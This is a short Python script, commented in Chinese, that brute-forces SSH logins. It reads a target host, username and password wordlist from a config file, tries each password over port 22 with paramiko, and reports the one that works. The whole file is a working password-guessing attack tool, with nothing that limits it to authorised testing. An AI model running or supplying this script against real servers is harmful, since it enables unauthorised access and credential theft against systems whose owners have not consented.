import paramiko
import toml
from pathlib import Path


def ssh_connect(target: str, username: str, password: str, code=1):
    """创建ssh连接
    :param password: 密码
    :param code: 默认1,返回0表示密码找到,返回1表示密码没找到
    :return: 0: 成功 1: 失败
    """
    # 创建ssh对象
    ssh = paramiko.SSHClient()
    # 允许连接不在know_hosts文件中的主机且在连接时将 host key 添加到本地 .HostKeys 中
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # 尝试连接,
    try:
        ssh.connect(target, port=22, username=username, password=password)
        code = 0
    except paramiko.AuthenticationException:
        pass
    # 关闭连接
    ssh.close()
    return code


def brute_force_ssh(target: str, username: str, password_file: str):
    print("开始破解")
    with open(password_file, "r") as file:
        passwords = file.readlines()
    # 密码总数
    len_passwords = len(passwords)
    # 计数器
    count = 0

    for password in passwords:
        # 去掉首尾空格
        password = password.strip()
        try:
            response = ssh_connect(target, username, password)

            if response == 0:
                print("密码已找到,为: " + password)
                break
            elif response == 1:
                count += 1
                print("\r进度: {0}/{1}".format(count, len_passwords), end="")
        except Exception as e:
            print(e)


# target = str(input('输入目标 ip: '))
# username = str(input('输入暴力破解的账号: '))
# password_file = str(input('输入密码字典路径: '))
# 读取配置文件
CONFIG_PATH = Path(__file__).parent / "config.toml"
CONFIG = toml.load(CONFIG_PATH)
TARGET = CONFIG["target"]
USERNAME = CONFIG["username"]
PASSWORD_FILE = Path(__file__).parent / CONFIG["password_file"]
print(f"目标: {TARGET}\n" f"用户名: {USERNAME}\n" f"密码字典: {PASSWORD_FILE}")

brute_force_ssh(target=TARGET, username=USERNAME, password_file=PASSWORD_FILE)
